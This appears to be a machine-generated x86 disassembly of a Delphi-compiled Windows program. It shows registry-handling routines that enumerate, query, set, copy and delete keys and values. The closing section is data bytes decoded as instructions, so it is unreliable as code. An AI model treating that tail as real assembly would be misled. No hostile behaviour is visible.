push eax
movzx edx [ ebp - 0x11 ]
mov eax [ ebp - 0xc ]
call sub_4217f0
push eax
call RegDeleteKeyA
test eax eax
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d49
lea eax [ ebp - 0x3c ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor eax eax
push ebp
push sub_421cf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_421804
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_421d70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_421804
mov eax [ ebp - 0x1c ]
push eax
call RegCloseKey
retn
mov ecx [ ebp - 0x34 ]
inc ecx
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_405620
mov ebx [ ebp - 0x38 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push ebx
mov eax [ ebp - 0x1c ]
push eax
call RegEnumKeyExA
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x3c ]
call sub_405728
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
call sub_421bd8
sub_421d50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4059dc
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegDeleteValueA
test eax eax
sete al
pop esi
pop ebx
retn
sub_421d70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
xor ecx ecx
mov edx 0x1c
call sub_403af4
lea eax [ ebx + 0x14 ]
push eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
lea eax [ ebx + 0xc ]
push eax
lea eax [ ebx + 0x8 ]
push eax
push 0x0
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push eax
call RegQueryInfoKeyA
test eax eax
sete al
mov edx [ rw-data ]
cmp [ edx + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
mov edx [ ebx + 0x4 ]
add [ ebx + 0x4 ] edx
mov edx [ ebx + 0xc ]
add [ ebx + 0xc ] edx
sub_421dd8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_421e90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_421d70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e97
lea eax [ ebp - 0x2c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov ecx [ ebp - 0x24 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov ebx [ ebp - 0x28 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumKeyExA
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_405728
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_421ea0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_421f58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_421d70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f5f
lea eax [ ebp - 0x2c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov ecx [ ebp - 0x1c ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov ebx [ ebp - 0x20 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumValueA
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_405728
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_421f68
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov eax ebp
xor ecx ecx
mov edx 0x8
call sub_403af4
lea eax [ ebp + 0x4 ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov eax edi
call sub_4059dc
push eax
mov eax [ esi + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
sete bl
mov eax [ esp ]
call sub_42169c
mov [ ebp ] al
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_421fb8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421f68
test al al
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_421fe0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421f68
test al al
je r-xdata
xor eax eax
movzx eax [ esp ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_422008
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
inc ebx
push ebx
push 0x1
mov eax edi
call sub_4059dc
mov ecx eax
mov edx ebp
mov eax esi
call sub_422188
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_422038
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
inc ebx
push ebx
push 0x2
mov eax edi
call sub_4059dc
mov ecx eax
mov edx ebp
mov eax esi
call sub_422188
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_422068
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov edx ebp
mov eax esi
call sub_421fb8
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_405530
mov eax edi
mov ecx ebx
xor edx edx
call sub_405620
push ebx
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi ]
call sub_4059dc
mov ecx eax
mov edx ebp
mov eax esi
call sub_4221f0
cmp [ esp ] 0x1
je r-xdata
mov eax [ edi ]
call sub_4059dc
call sub_40a868
mov edx eax
mov eax edi
call sub_405c6c
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_42162c
jmp r-xdata
sub_4220f4
push ebx
add esp 0xfffffff8
mov ebx edx
push 0x4
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_4221f0
cmp [ esp + 0x4 ] 0x3
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_42162c
sub_422124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax ebx
call sub_421f68
test al al
je r-xdata
xor esi esi
mov esi [ ebp - 0xc ]
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x4
je r-xdata
cmp esi [ ebp + 0x8 ]
jg r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax edi
call sub_42162c
jmp r-xdata
push esi
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4221f0
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422188
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
call sub_42166c
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
mov eax edi
call sub_4059dc
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegSetValueExA
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_4221f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax esi
call sub_4059dc
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExA
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42169c
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_422274
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4222fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_421658
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov edx ebx
mov eax esi
call sub_4217f0
push eax
call RegOpenKeyExA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422301
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_405a84
sub_42230c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_422371
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
and eax 0x300
or eax 0x20009
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
call sub_422274
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
setne [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422378
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
retn
push ebx
call RegCloseKey
sub_422384
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_421804
xor eax eax
push ebp
push sub_422497
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_421fb8
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42249e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_421804
retn
mov eax ebx
call sub_402ee8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_422474
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx esi
call sub_4221f0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_421804
xor eax eax
push ebp
push sub_422457
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
movzx eax [ ebp - 0x11 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx esi
call sub_422188
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42245e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_421804
retn
sub_4224a4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4225bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_421804
xor eax eax
push ebp
push sub_422596
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421d70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42259d
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_421804
retn
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_422384
pop ecx
mov ecx [ ebp - 0x20 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov ebx [ ebp - 0x24 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_405728
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_422384
pop ecx
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push edi
push esi
call RegEnumValueA
test eax eax
jne r-xdata
sub_4225cc
push ebp
mov ebp esp
add esp 0xffffffb0
xor ecx ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42280d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_421804
xor eax eax
push ebp
push sub_4227e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421d70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227ea
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
call sub_421804
retn
mov ecx [ ebp - 0x40 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_405620
mov eax [ ebp - 0x44 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x48 ]
call sub_405728
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_422274
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x40 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegEnumKeyExA
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_4227b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_421804
xor eax eax
push ebp
push sub_422796
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x4c ]
call sub_405728
mov edx [ ebp - 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421808
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x50 ]
call sub_405728
mov edx [ ebp - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_422274
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_422773
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_4224a4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
call sub_4225cc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42277a
mov eax [ ebp - 0x24 ]
push eax
call RegCloseKey
retn
sub_422818
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42230c
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42230c
test al al
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422274
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4228fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_421808
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_422274
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
xor eax eax
push ebp
push sub_4228dc
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4224a4
pop ecx
push ebp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4225cc
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_421bd8
sub_42291b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_422960
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422967
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4060f8
sub_42296e
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
shr [ ecx ] 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sub [ edx ] eax
or al 0x0
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edx + ebp ] bp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] ch
inc edx
add [ eax + eax ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
dec esp
sub al [ edx ]
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
mov al [ 0x100422a ]
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
mov esp 0x300422a
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x2a ] cl
inc edx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or [ eax + 0x6d ] esi
inc ebx
insb
popad
jb r-xdata
add eax 0x6f4e6d70
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sub al [ edx ]
mov eax eax
and al 0x2b
inc edx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
mov eax 0x8b00422a
shl [ ebx + ebp ] 0x42
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600422a ] bh
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
insd
outsd
or esi [ eax + 0x73 ]
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
outsd
imul esp [ ebx + 0x73 ] 0x2b0cc08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
push esp
push eax
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
sub eax [ edx ]
pop es
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
push ebx
je r-xdata
push eax
outsb
dec esi
jo r-xdata
imul esp [ ebx + 0x73 ] 0x422ba490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
popad
jae r-xdata
push 0x5657469
jo r-xdata
inc esp
popad
jae r-xdata
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
jo r-xdata
dec ecx
outsb
jb r-xdata
inc ebx
outsd
jo r-xdata
push es
jo r-xdata
je r-xdata
inc edx
insb
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add [ edi ] cl
add [ eax ] al
jo r-xdata
add [ edi ] al
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov eax 0x600422a
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
dec esp
sub eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ 0x2d380042 ] ch
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ esp + ebp + 0x42 ] bl
add [ edi ] al
dec ebp
jb r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
inc esp
outsd
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax ] ah
jne r-xdata
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
push 0x8b736369
push eax
outsb
dec esi
outsd
je r-xdata
shl [ eax + 0x2c ] 0x42
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
insd
je r-xdata
dec esi
outsd
je r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x2c60c08b
inc edx
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
je r-xdata
dec esi
outsd
insd
push edi
je r-xdata
insb
add [ eax + 0x700422b ] ah
sldt [ eax ]
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x422a9090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
push 0x65
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
